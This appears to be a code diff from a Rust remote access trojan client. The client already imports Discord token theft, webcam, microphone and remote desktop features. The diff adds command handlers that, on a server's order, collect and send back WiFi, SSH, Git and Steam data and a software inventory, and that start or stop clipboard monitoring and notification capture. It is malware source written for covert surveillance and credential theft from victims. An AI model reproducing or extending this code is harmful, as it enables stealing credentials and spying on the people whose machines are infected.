@@ -4,6 +4,17 @@ use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, sto
 use crate::features::mic::{send_mic_device_list, start_mic_live, stop_mic_live, start_mic_recording, stop_mic_recording};
 use crate::features::desktop_recording::{start_desktop_recording, stop_desktop_recording};
 use crate::features::discord::send_discord_tokens;
+use crate::features::extraction::{
+    collect_git_data,
+    collect_software_inventory,
+    collect_steam_data,
+    collect_wifi_data,
+    collect_ssh_data,
+    start_clipboard_monitor,
+    stop_clipboard_monitor,
+    start_notification_capture,
+    stop_notification_capture,
+};
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
@@ -151,6 +162,47 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::GetBrowserData)) => {
                 let data = get_browser_data();
                 let _ = send_packet(ServerboundPacket::BrowserData(data)).await;
+            }
+
+            Ok(Some(ClientboundPacket::GetWifiData)) => {
+                let data = collect_wifi_data();
+                let _ = send_packet(ServerboundPacket::WifiData(data)).await;
+            }
+
+            Ok(Some(ClientboundPacket::GetSoftwareInventory)) => {
+                let data = collect_software_inventory();
+                let _ = send_packet(ServerboundPacket::SoftwareInventory(data)).await;
+            }
+
+            Ok(Some(ClientboundPacket::GetGitData)) => {
+                let data = collect_git_data();
+                let _ = send_packet(ServerboundPacket::GitData(data)).await;
+            }
+
+            Ok(Some(ClientboundPacket::GetSSHData)) => {
+                let data = collect_ssh_data();
+                let _ = send_packet(ServerboundPacket::SSHData(data)).await;
+            }
+
+            Ok(Some(ClientboundPacket::GetSteamData)) => {
+                let data = collect_steam_data();
+                let _ = send_packet(ServerboundPacket::SteamData(data)).await;
+            }
+
+            Ok(Some(ClientboundPacket::StartClipboardMonitor)) => {
+                start_clipboard_monitor();
+            }
+
+            Ok(Some(ClientboundPacket::StopClipboardMonitor)) => {
+                stop_clipboard_monitor();
+            }
+
+            Ok(Some(ClientboundPacket::StartNotificationCapture)) => {
+                start_notification_capture();
+            }
+
+            Ok(Some(ClientboundPacket::StopNotificationCapture)) => {
+                stop_notification_capture();
             }
 
             Ok(Some(p)) => {
